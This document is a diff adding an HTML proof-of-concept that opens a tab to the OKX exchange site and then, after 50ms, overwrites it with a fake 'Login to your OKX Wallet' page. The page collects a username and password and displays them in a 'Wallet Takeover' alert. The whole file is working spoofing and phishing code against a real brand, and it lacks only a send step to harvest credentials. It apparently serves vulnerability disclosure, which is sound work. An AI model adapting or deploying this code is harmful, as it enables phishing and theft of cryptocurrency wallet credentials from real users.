@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
+
+    <script>
+      function spoof() {
+        // Open new tab that pointing to the target or spoofed URL
+        let win = window.open("https://www.okx.com", "_blank");
+
+        // After 50ms, Inject the fake content before navigation end
+        setTimeout(() => {
+          try {
+            win.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <title>Login Example</title>
+              <style>
+                body {
+                  font-family: Arial, sans-serif;
+                  display: flex;
+                  flex-direction: column;
+                  align-items: center;
+                  justify-content: center;
+                  height: 100vh;
+                  background-color: #f5f5f5;
+                }
+                .login-box {
+                  background: white;
+                  padding: 20px;
+                  border-radius: 8px;
+                  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+                  width: 300px;
+                }
+                input {
+                  width: 100%;
+                  padding: 10px;
+                  margin: 8px 0;
+                  border: 1px solid #ccc;
+                  border-radius: 4px;
+                }
+                button {
+                  width: 100%;
+                  padding: 10px;
+                  background-color: #007bff;
+                  color: white;
+                  border: none;
+                  border-radius: 4px;
+                  cursor: pointer;
+                }
+              </style>
+            </head>
+            <body>
+              <div class="login-box">
+                <img src="https://cdn.glitch.global/8b71c255-b804-4ee0-8d5a-7f047cc8f961/okg_technology_logo.jpeg?v=1751429976368" alt="OKX Logo" style="width: 120px; margin-bottom: 20px;">
+                <h2>Login to your OKX Wallet for Backup</h2>
+                <input type="text" placeholder="Username" id="username">
+                <input type="password" placeholder="Password" id="password">
+                <button onclick="submitLogin()">Submit</button>
+              </div>
+
+              <script>
+                function submitLogin() {
+                  const user = document.getElementById('username').value;
+                  const pass = document.getElementById('password').value;
+                  alert('Wallet Takeover:\\nUsername: ' + user + '\\nPassword: ' + pass);
+                }
+              <\/script>
+            </body>
+            </html>
+          `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
+  </body>
+</html>
